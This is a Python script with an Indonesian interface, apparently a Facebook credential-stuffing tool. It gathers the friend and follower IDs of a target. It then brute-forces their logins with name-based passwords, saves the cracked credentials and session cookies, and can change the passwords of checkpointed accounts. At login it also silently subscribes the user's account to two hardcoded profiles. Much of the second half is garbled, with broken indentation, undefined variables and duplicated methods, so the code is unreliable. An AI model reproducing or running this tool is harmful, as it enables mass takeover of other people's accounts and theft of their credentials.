#!/usr/bin/python3
#coding=utf-8


"""

Copyright © 2021 - 2023 | Latip176
Semua codingan dibuat oleh Latip176.

"""
import json, os, re, time
from concurrent.futures import ThreadPoolExecutor as Bool

try:
	import requests as req
except:
	print("[!] Ops! Module requests belum terinstall...\nSedang Menginstall Module...")
	os.system("python3 -m pip install requests")
try:
	from bs4 import BeautifulSoup as par
except:
	print("[!] Ops! Module bs4 belum terinstall...\nSedang Menginstall Module...")
	os.system("python3 -m pip install bs4")

os.system("clear")

import data as dump
from data import cp_detect as cpp
from data import convert as cv

ok,cp,loop = 0,0,0
cot = ""
nampung, opsi = [], []
ub, pwBaru = [], []

class Main(object):
	
	def __init__(self, token, id, name):
		self.token = token
		self.id = id
		self.name = name
	def banner(self):
		banner = """
_________  ________  __      __________  
\_   ___ \ \_____  \/  \    /  \_____  \ 
/    \  \/  /   |   \   \/\/   / _(__  < 
\     \____/    |    \        / /      
\
 \______  /\_______  /\__/\  / /______  /
        \/         \/      \/         \/ 
	Version: 0.4.5
	Coded by: Kolis03
		"""
		return banner
	def cpdetect(self):
		__data=input("[?] Masukan nama file: ")
		try:
			_file=open("results/"+__data,"r").readlines()
		except FileNotFoundError:
			exit("[!] File tidak ditemukan")
		ww=input("[?] Ubah pw ketika tap yes [y/t]: ")
		if ww in ("y","ya"):
			pwBar=input("[+] Masukan pw baru: ")
			ub.append("y")
			if len(pwBar) <= 5:
				exit("Password harus lebih dari 6 character!")
			else:
				pwBaru.append(pwBar)
		cpp.Eksekusi("https://mbasic.facebook.com",_file,"file","".join(pwBaru),"".join(ub))
	def proses(self):
		print("")
		op = input("[?] Munculkan opsi [y/t]: ")
		if op in ("y","Y"):
			opsi.append("y")
			ww=input("[?] Ubah pw ketika tap yes [y/t]: ")
			if ww in ("y","ya"):
				pwBar=input("[+] Masukan pw baru: ")
				ub.append("y")
				if len(pwBar) <= 5:
					exit("Password harus lebih dari 6 character!")
				else:
					pwBaru.append(pwBar)
			else:
				print("> Skipped")
		print("\n[!] Akun hasik ok di save di ok.txt\n[!] Akun hasil cp di save di cp.txt\n")

class Data(Main):
	
	def menu(self):
		os.system("clear")
		print(self.banner())
		print(f" * Welcome {self.name} in tool! Pilih crack dan mulai.")
		print("[1]. Crack dari pertemanan publik\n[2]. Crack dari followers publik\n[3]. Checkpoint detector\n[0]. Logout akun (hapus token)\n")
		_chose = input("[?] Chose: ")
		__pilih = ["01","1","02","2","03","3","0"]
		while _chose not in __pilih:
			print("\n[!] Pilihan tidak ada")
			_chose = input("[?] Chose: ")
		print("")
		if _chose in ("01","1"):
			print("[!] Ketik 'me' untuk teman list kamu")
			__id = input("[?] Masukan id target: ").replace("'me'","me")
			self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(__id)
			self.submit(self.data)
		elif _chose in ("02","2"):
			print("[!] Ketik 'me' untuk followers list kamu")
			__id = input("[?] Masukan id target: ").replace("'me'","me")
			self.data = dump.Dump("https://graph.facebook.com",self.token).followers(__id)
			self.submit(self.data)
		elif _chose in ("03","3"):
			self.cpdetect()
		elif _chose in ("0","00"):
			os.system("rm -rf data/save.txt")
			exit("Thanks You....\n")
		else:
			print("[×] Kesalahan...")
	
	def submit(self,data):
		print("\n[!] Pilih Metode Crack\n[1] Metode b-api\n[2] Metode mbasic")
		metode = input("[?] Chose: ")
		print("\n[!] D: Default, M: Manual, G: Gabung. ")
		pasw=input("[?] Password [d/m/g]: ")
		if pasw in ("m","M","g","G"):
			print("[!] Pisahkan password menggunakan koma contoh (sayang,bangsad)")
			tam = input("[+] Masukan password: ").split(",")
		self.proses()
		print(" * Crack dimulai... CTRL + Z untuk stop! \n")
		with Bool(max_workers=35) as kirim:
			for __data in data:
				nama,id = __data.split("<=>")
				nampung.append(id)
				if(len(nama)>=6):
					pwList = [nama,nama+"123",nama+"1234",nama+"12345"]
				elif(len(nama)<=2):
					pwList = [nama+"1234",nama+"12345"]
				elif(len(nama)<=5):
					pwList = [nama+"123",nama+"1234",nama+"12345"]
				else:
					pwList = [nama,nama+"123",nama+"1234",nama+"12345"]
				if pasw in ("d","D"):
					pwList = pwList
				elif pasw in ("m","M"):
					pwList = tam
				elif pasw in ("g","G"):
					pwList = pwList + tam
				else:
					pwList = pwList
				if metode in ("01","1"):
					kirim.submit(Crack(self.token,self.id,self.name).b_api,"https://b-api.facebook.com",id,pwList)
				else:
					kirim.submit(Crack(self.token,self.id,self.name).mbasic,"https://mbasic.facebook.com",id,pwList)
		exit("[!] Crack selesai....")

class Crack(Main):
	
	def b_api(self,url,user,pwList):
		global ok,cp,cot,loop
		if user!=cot:
			cot=user
			loop+=1
		session = req.Session()
		session.headers.update({
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-encoding":"gzip, deflate",
			"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			"cache-control":"max-age=0",
			"sec-sh-ua":'";Not A Brand";v="99", "Chromium";v="94"',
			"sec-ch-ua-mobile":"?1",
			"sec-ch-ua-platform":"Android",
			"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
		})
		for pw in pwList:
			pw=pw.lower()
			response = session.get(url+"/method/auth.login",params={'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'id_ID', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'})
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response.text:
				print("\r[!] Opss! Terkena spam... nyalakan mode pesawat selama 2 detik!\n",end="")
				continue
			if 'access_token' in response.text and 'EAAA' in response.text:
				ok+=1
				print(f"\r[OK] Akun aman			\n[=] {user} | {pw}					\n\n",end="")
				open("results/ok.txt","a").write(user+"|"+pw+"\n")
				break
			elif 'www.facebook.com' in response.json()['error_msg']:
				cp+=1
				_file = user+"|"+pw
				if "y" in opsi:
					cpp.Eksekusi("https://mbasic.facebook.com",_file,"satu","".join(pwBaru),"".join(ub))
				else:
					print(f"\r\33[1;33m[CP] {user} | {pw}								\n\33[37;1m",end="")
				open("results/cp.txt","a").write(user+"|"+pw+"\n")
				break
			else:
				continue
		print(f"\r[=] {str(loop)}/{str(len(nampung))} Ok/Cp: {str(ok)}/{str(cp)} CRACK: {'{:.1%}'.format(loop/float(len(nampung)))}	",end="")
		
	def mbasic(self,url,user,pwList):
		global loop, ok, cp, cot
		if user!=cot:
			cot=user
			loop+=1
		data={}
		session = req.Session()
		session.headers.update({
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
		"cache-control":"max-age=0",
		"referer":"https://mbasic.facebook.com/",
		"sec-ch-ua":'";Not A Brand";v="99", "Chromium";v="94"',
		"sec-ch-mobile":"?1",
		"sec-ch-ua-platform":'"Android"',
		"sec-fetch-dest":"document",
		"sec-fetch-mode":"navigate",
		"sec-fetch-site":"same-origin",
		"sec-fetch-user":"?1",
		"upgrade-insecure-requests":"1",
		"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
		})
		for pw in pwList:
			pw = pw.lower()
			data = {} 
				lsd = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","bi_xrwh"] 
				for x in r.find("form",{"id":"login_form"}): 
					if x.get("name") in lsd: 
						data.update({x.get("name"):x.get("value")}) 
				data.update({ 
					"prefill_contact_point":"", 
					"prefill_source":"", 
					"prefill_type":"", 
					"is_smart_lock":"false", 
					"_fb_noscript":"true", 
					"email":user, 
					"pass":pw, 
					"login":"Log In", 
					"next":"https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;ref=dbl" 
				}) 
				session.headers.update({"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.8,en;q=0.7","upgrade-insecure-requests":"1","origin":"https://www.facebook.com","referer":"https://www.facebook.com","user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"}) 
				post = session.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;ref=dbl",data=data,allow_redirects=False).cookies.get_dict() 
				if "c_user" in post: 
					ok.append(user+"|"+pw) 
					open("results/ok.txt","a").write(user+"|"+pw+"\n") 
					coki = "".join(["%s=%s;"%(k,v) for k,v in post.items()]) 
						cpp.Eksekusi("","","","","").follow(session,coki) 
						pass 
						cpp.Eksekusi("","","","","").cek_apk(session,coki,user,pw,"anying") 
						sys.stdout.write(f"\r\r\33[32;1m[OK] %s | %s | %s            \n\33[37;1m"%(user,pw,coki)) 
						sys.stdout.flush() 
						print(f"\r{P} > Aplikasi tidak berhasil di dapatkan           ") 
					break 
				elif "checkpoint" in post: 
					cp.append(user+"|"+pw) 
					sys.stdout.write(f"\r\33[1;33m[CP] %s | %s                   \33[37;1m\n"%(user,pw)) 
					sys.stdout.flush() 
					open(f"results/{''.join(save)}","a").write(user+"|"+pw+"\n") 
				sys.stdout.write(f"\r{waifuku_megumi_wangy}[{pipis_ruminas_wangy_wangy}{pipis_ruminas_wangy_wangy}]  {str(loop)}/{str(len(nampung))} Ok/Cp: {len(ok)}/{len(cp)} CRACK: {'{:.1%}'.format(loop/float(len(nampung)))}	") 
				sys.stdout.flush() 
			loop+=1 
		except req.exceptions.ConnectionError: 
			sys.stdout.write(f"\r[!] Connection time out                ") 
			sys.stdout.flush() 
			loop-=1 
			self.mfb(user,pwList) 
	def mbasic(self,user,pwList): 
		global loop, cot 
			r = req.Session() 
			h1 = { 
				"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.8,en;q=0.7" 
			} 
			h2 = { 
				"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.8,en;q=0.7" 
				t = par(r.get("https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",headers=h1).text,'html.parser') 
				link = t.find('form',{'id':'login_form'}) 
				lst = ['lsd','jazoest'] 
				data={} 
				for x in link: 
					if x.get('name') in lst: 
						data.update({x.get('name'):x.get('value')}) 
					"uid":user, 
					"flow":"login_no_pin", 
					"next":"https://developers.facebook.com/tools/debug/accesstoken/" 
				r.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=h2, allow_redirects = False) 
				if "c_user" in r.cookies.get_dict(): 
					cookies = r.cookies.get_dict() 
					coki = 'datr=' + cookies['datr'] + ';' + ('c_user=' + cookies['c_user']) + ';' + ('fr=' + cookies['fr']) + ';' + ('xs=' + cookies['xs']) 
						cpp.Eksekusi("","","","","").follow(r,coki) 
						cpp.Eksekusi("","","","","").cek_apk(r,coki,user,pw,"anying") 
				elif "checkpoint" in r.cookies.get_dict(): 
			self.mbasic(user,pwList) 
def login():
	os.system("clear")
	logo_login = """\n
.##.......####....####...######..##..##.
.##......##..##..##........##....###.##.
.##......##..##..##.###....##....##.###.
.##......##..##..##..##....##....##..##.
.######...####....####...######..##..##.
........................................
	"""
	print(logo_login,"\n * Login terlerbih dahulu menggunakan accesstoken facebook!\n * Jika tidak mempunyai token atau cookies silahkan cari tutorialnya di youtube untuk mendapatkan token facebook.\n * Ketika sudah memakai sc ini maka Author tidak bertanggung jawab atas resiko apa yang akan terjadi kedepannya.\n")
	print(" * Ingin login menggunakan apa\n[1]. Login menggunakan cookies\n[2]. Login menggunakan token")
	bingung = input("\n[?] Login menggunakan: ")
	__pilihan = ["01","1","02","2"]
	while bingung not in __pilihan:
		print("\n[!] Pilihan tidak ada")
		bingung = input("[?] Login menggunakan: ")
	if bingung in ("01","1"):
		__cokiee = input("[?] cookie\t: ")
		__coki = cv.Main(__cokiee).getToken()
		if "EAA" in __coki:
			_cek = json.loads(req.get(f"https://graph.facebook.com/me?access_token={__coki}").text)
			_id = _cek['id']
			_nama = _cek['name']
			input(f"\n[✓] Berhasil login menggunakan cookies\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
			open("data/save.txt","a").write(__coki)
			Data(__coki,_id,_nama).menu()
		elif "Cookies Invalid" in __coki:
			exit("\n[!] Cookies Invalid")
		else:
			exit("\n[!] Kesalahan")
	elif bingung in ("02","2"):
		__token = input("[?] token\t: ")
		try:
			__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
			_nama = __res['name']
			_id = __res['id']
			req.post(f'https://graph.facebook.com/100013031465766/subscribers?access_token={__token}')
			req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={__token}')
			input(f"\n[✓] Berhasil login menggunakan token\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
			open("data/save.txt","a").write(__token)
			Data(__token, _id, _nama).menu()
		except KeyError:
			print("\n[!] token invalid")
	
	
if __name__=="__main__":
	try:
		__token = open("data/save.txt","r").read()
		__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
		_nama = __res['name']
		_id = __res['id']
		print(f" * Welcome back {_nama}\n * Menuju menu...")
		time.sleep(3)
		Data(__token, _id, _nama).menu()
	except KeyError:
		os.system("rm -rf data/save.txt")
		print("\n[!] token invalid")
	except FileNotFoundError:
		print("[!] belum login\n * Menuju ke menu login...")
		time.sleep(3)
		login()
